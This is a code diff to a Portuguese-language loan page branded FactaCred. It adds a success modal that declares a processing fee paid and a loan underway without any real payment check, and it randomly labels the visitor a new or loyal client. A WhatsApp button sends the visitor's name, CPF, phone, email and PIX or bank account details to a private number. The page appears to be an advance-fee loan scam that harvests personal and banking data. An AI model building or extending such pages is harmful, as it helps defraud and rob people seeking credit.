@@ -37,6 +37,84 @@
     <!-- QR Code Library -->
     <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
     <link rel="stylesheet" href="styles.css" />
+    <style>
+      /* Estilo para o modal de sucesso */
+      .success-modal {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .success-modal-content {
+        background-color: #fff;
+        border-radius: 10px;
+        padding: 30px;
+        max-width: 500px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        position: relative;
+        animation: modalFadeIn 0.5s ease;
+      }
+
+      @keyframes modalFadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(-20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .success-modal-icon {
+        font-size: 60px;
+        color: #28a745;
+        margin-bottom: 20px;
+      }
+
+      .success-modal-title {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 15px;
+        color: #333;
+      }
+
+      .success-modal-text {
+        font-size: 16px;
+        color: #666;
+        margin-bottom: 25px;
+      }
+
+      .success-modal-buttons {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+      }
+
+      .success-modal-buttons .btn {
+        padding: 10px 25px;
+        font-weight: 500;
+      }
+
+      .btn-whatsapp {
+        background-color: #25d366;
+        color: white;
+      }
+
+      .btn-whatsapp:hover {
+        background-color: #1fba58;
+        color: white;
+      }
+    </style>
   </head>
   <body>
     <!-- Navbar -->
@@ -653,6 +731,27 @@
       </div>
     </section>
 
+    <!-- Modal de Sucesso -->
+    <div class="success-modal" id="success-modal">
+      <div class="success-modal-content">
+        <div class="success-modal-icon">
+          <i class="fas fa-check-circle"></i>
+        </div>
+        <h3 class="success-modal-title">Parabéns!</h3>
+        <p class="success-modal-text">
+          Agradecemos por ser um cliente <span id="client-type">novo</span> da
+          FactaCred. Seu pagamento foi confirmado e sua solicitação de
+          empréstimo está em processamento.
+        </p>
+        <div class="success-modal-buttons">
+          <button class="btn btn-primary" id="modal-ok-btn">OK</button>
+          <button class="btn btn-whatsapp" id="modal-whatsapp-btn">
+            <i class="fab fa-whatsapp me-2"></i> Acompanhar no WhatsApp
+          </button>
+        </div>
+      </div>
+    </div>
+
     <!-- Advantages Section -->
     <section class="advantages-section">
       <div class="container">
@@ -1144,6 +1243,8 @@
       </div>
     </div>
 
+    <!-- Restante do código HTML permanece igual... -->
+
     <!-- Bootstrap JS Bundle with Popper -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <!-- AOS Animation Library -->
@@ -1209,6 +1310,12 @@
         const continueToStep4 = document.getElementById("continue-to-step4");
         const confirmPayment = document.getElementById("confirm-payment");
 
+        // Elementos do modal
+        const successModal = document.getElementById("success-modal");
+        const modalOkBtn = document.getElementById("modal-ok-btn");
+        const modalWhatsappBtn = document.getElementById("modal-whatsapp-btn");
+        const clientType = document.getElementById("client-type");
+
         // Outros elementos
         const copyPixCode = document.getElementById("copy-pix-code");
         const loadingAnimation = document.getElementById("loading-animation");
@@ -1219,6 +1326,49 @@
         const bankOptionFields = document.getElementById("bank-option-fields");
         const bankName = document.getElementById("bank-name");
         const otherBankRow = document.getElementById("other-bank-row");
+
+        // Função para preparar a mensagem do WhatsApp
+        function prepareWhatsAppMessage() {
+          // Coletar todos os dados do formulário
+          const nome = document.getElementById("nome").value;
+          const cpf = document.getElementById("cpf").value;
+          const telefone = document.getElementById("telefone").value;
+          const email = document.getElementById("email").value;
+
+          // Verificar qual método de recebimento foi selecionado
+          let dadosBancarios = "";
+          if (methodPix.checked) {
+            const pixKey = document.getElementById("pix-key").value;
+            dadosBancarios = `Método: PIX\nChave PIX: ${pixKey}`;
+          } else {
+            const bankNameSelect = document.getElementById("bank-name");
+            let bankNameValue =
+              bankNameSelect.options[bankNameSelect.selectedIndex].text;
+
+            // Se for "Outro", pegar o valor digitado
+            if (bankNameSelect.value === "other") {
+              const otherBankName =
+                document.getElementById("other-bank-name").value;
+              bankNameValue = otherBankName;
+            }
+
+            const accountType =
+              document.getElementById("account-type").value === "checking"
+                ? "Conta Corrente"
+                : "Conta Poupança";
+            const agency = document.getElementById("agency").value;
+            const account = document.getElementById("account").value;
+            const accountDigit = document.getElementById("account-digit").value;
+
+            dadosBancarios = `Método: Conta Bancária\nBanco: ${bankNameValue}\nTipo de Conta: ${accountType}\nAgência: ${agency}\nConta: ${account}\nDígito: ${accountDigit}`;
+          }
+
+          // Montar a mensagem para o WhatsApp
+          const mensagem = `*Nova solicitação de empréstimo*\n\n*Dados Pessoais:*\nNome: ${nome}\nCPF: ${cpf}\nTelefone: ${telefone}\nE-mail: ${email}\n\n*Dados Bancários:*\n${dadosBancarios}\n\n*Proposta:*\nValor liberado: R$ 2.732,80\nParcela: R$ 70,00 x 48\nTaxa de serviço: R$ 49,90\n\n*Pagamento da taxa de processamento realizado.*`;
+
+          // Codificar a mensagem para URL
+          return encodeURIComponent(mensagem);
+        }
 
         // Mostrar/ocultar campo para digitar nome do banco quando selecionar "Outro"
         if (bankName) {
@@ -1451,57 +1601,36 @@
           });
         }
 
-        // Confirm payment - Enviar dados para WhatsApp
+        // Confirm payment - Mostrar modal de sucesso
         if (confirmPayment) {
           confirmPayment.addEventListener("click", function (e) {
             e.preventDefault();
 
-            // Coletar todos os dados do formulário
-            const nome = document.getElementById("nome").value;
-            const cpf = document.getElementById("cpf").value;
-            const telefone = document.getElementById("telefone").value;
-            const email = document.getElementById("email").value;
+            // Determinar aleatoriamente se é um cliente novo ou fidelizado
+            const isNewClient = Math.random() > 0.5;
+            clientType.textContent = isNewClient ? "novo" : "fidelizado";
 
-            // Verificar qual método de recebimento foi selecionado
-            let dadosBancarios = "";
-            if (methodPix.checked) {
-              const pixKey = document.getElementById("pix-key").value;
-              dadosBancarios = `Método: PIX\nChave PIX: ${pixKey}`;
-            } else {
-              const bankNameSelect = document.getElementById("bank-name");
-              let bankNameValue =
-                bankNameSelect.options[bankNameSelect.selectedIndex].text;
+            // Mostrar o modal
+            successModal.style.display = "flex";
+          });
+        }
 
-              // Se for "Outro", pegar o valor digitado
-              if (bankNameSelect.value === "other") {
-                const otherBankName =
-                  document.getElementById("other-bank-name").value;
-                bankNameValue = otherBankName;
-              }
+        // Botão OK do modal
+        if (modalOkBtn) {
+          modalOkBtn.addEventListener("click", function () {
+            successModal.style.display = "none";
+          });
+        }
 
-              const accountType =
-                document.getElementById("account-type").value === "checking"
-                  ? "Conta Corrente"
-                  : "Conta Poupança";
-              const agency = document.getElementById("agency").value;
-              const account = document.getElementById("account").value;
-              const accountDigit =
-                document.getElementById("account-digit").value;
-
-              dadosBancarios = `Método: Conta Bancária\nBanco: ${bankNameValue}\nTipo de Conta: ${accountType}\nAgência: ${agency}\nConta: ${account}\nDígito: ${accountDigit}`;
-            }
-
-            // Montar a mensagem para o WhatsApp
-            const mensagem = `*Nova solicitação de empréstimo*\n\n*Dados Pessoais:*\nNome: ${nome}\nCPF: ${cpf}\nTelefone: ${telefone}\nE-mail: ${email}\n\n*Dados Bancários:*\n${dadosBancarios}\n\n*Proposta:*\nValor liberado: R$ 2.732,80\nParcela: R$ 70,00 x 48\nTaxa de serviço: R$ 49,90\n\n*Pagamento da taxa de processamento realizado.*`;
-
-            // Codificar a mensagem para URL
-            const mensagemCodificada = encodeURIComponent(mensagem);
-
-            // Abrir o WhatsApp com a mensagem
+        // Botão WhatsApp do modal
+        if (modalWhatsappBtn) {
+          modalWhatsappBtn.addEventListener("click", function () {
+            const mensagemCodificada = prepareWhatsAppMessage();
             window.open(
               `https://wa.me/556993238278?text=${mensagemCodificada}`,
               "_blank"
             );
+            successModal.style.display = "none";
           });
         }
 
